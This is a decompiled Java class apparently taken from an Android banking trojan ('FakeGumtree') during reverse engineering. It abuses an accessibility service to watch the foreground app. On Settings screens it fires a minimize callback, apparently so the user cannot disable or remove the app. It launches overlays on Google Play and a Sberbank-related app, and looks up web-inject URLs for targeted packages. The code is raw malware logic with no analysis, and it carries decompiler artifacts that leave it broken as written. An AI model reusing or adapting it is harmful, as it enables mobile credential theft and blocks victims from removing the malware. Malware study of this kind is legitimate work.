package com.gumsis.checktls;

import android.content.Context;
import android.provider.Settings.Secure;
import android.provider.Settings.SettingNotFoundException;
import android.text.TextUtils.SimpleStringSplitter;
import android.view.accessibility.AccessibilityNodeInfo;
import com.gumsis.Realtalk;
import com.gumsis.srs.GPSrs;
import com.gumsis.wb.WITools;

public class ASTls
{
  private static final int ACCESSIBILITY_ENABLED = 1;
  
  public static boolean isAccessibilitySettingsOn(Context paramContext)
  {
    int i = 0;
    String str = paramContext.getPackageName() + "/" + GPSrs.class.getCanonicalName();
    try
    {
      int j = Settings.Secure.getInt(paramContext.getApplicationContext().getContentResolver(), "accessibility_enabled");
      i = j;
    }
    catch (Settings.SettingNotFoundException localSettingNotFoundException)
    {
      for (;;)
      {
        TextUtils.SimpleStringSplitter localSimpleStringSplitter;
        localSettingNotFoundException.printStackTrace();
      }
    }
    localSimpleStringSplitter = new TextUtils.SimpleStringSplitter(':');
    if (i == 1)
    {
      paramContext = Settings.Secure.getString(paramContext.getApplicationContext().getContentResolver(), "enabled_accessibility_services");
      if (paramContext != null)
      {
        localSimpleStringSplitter.setString(paramContext);
        while (localSimpleStringSplitter.hasNext()) {
          if (localSimpleStringSplitter.next().equalsIgnoreCase(str)) {
            return true;
          }
        }
      }
    }
    return false;
  }
  
  public void packageEqualsProcessing(Context paramContext, AccessibilityNodeInfo paramAccessibilityNodeInfo, OnASTlsCallback paramOnASTlsCallback)
    throws Exception
  {
    String str = paramAccessibilityNodeInfo.getPackageName().toString();
    if (str.equals(Realtalk.getSettingsPackageFromJNI()))
    {
      if ((!NdTls.hasText(paramAccessibilityNodeInfo, paramContext.getString(2131361806))) && (!NdTls.hasText(paramAccessibilityNodeInfo, paramContext.getString(2131361810))) && (!NdTls.hasText(paramAccessibilityNodeInfo, paramContext.getString(2131361816)))) {
        break label125;
      }
      paramOnASTlsCallback.onMinimize();
    }
    label125:
    do
    {
      return;
      if ((str.equals(Realtalk.getXiaomiSettingsPackageFromJNI())) && ((NdTls.hasText(paramAccessibilityNodeInfo, paramContext.getString(2131361806))) || (NdTls.hasText(paramAccessibilityNodeInfo, paramContext.getString(2131361810))) || (NdTls.hasText(paramAccessibilityNodeInfo, paramContext.getString(2131361816)))))
      {
        paramOnASTlsCallback.onMinimize();
        return;
      }
      if ((Realtalk.isHardMode(paramContext)) && (Realtalk.isCurPackage(str)) && (!Realtalk.isDisableGp(paramContext)))
      {
        IntTls.startGP(paramContext);
        return;
      }
      if ((str.equals(Realtalk.getSPackage())) && (!Realtalk.isDisS(paramContext))) {
        IntTls.startSber(paramContext);
      }
      if (Realtalk.isCurPackageMinimize(str)) {
        paramOnASTlsCallback.onMinimize();
      }
      paramAccessibilityNodeInfo = WITools.getWEBInjectUrl(str);
    } while (paramAccessibilityNodeInfo == null);
    IntTls.startWb(paramContext, paramAccessibilityNodeInfo, str);
  }
  
  public static abstract interface OnASTlsCallback
  {
    public abstract void onMinimize();
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/checktls/ASTls.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */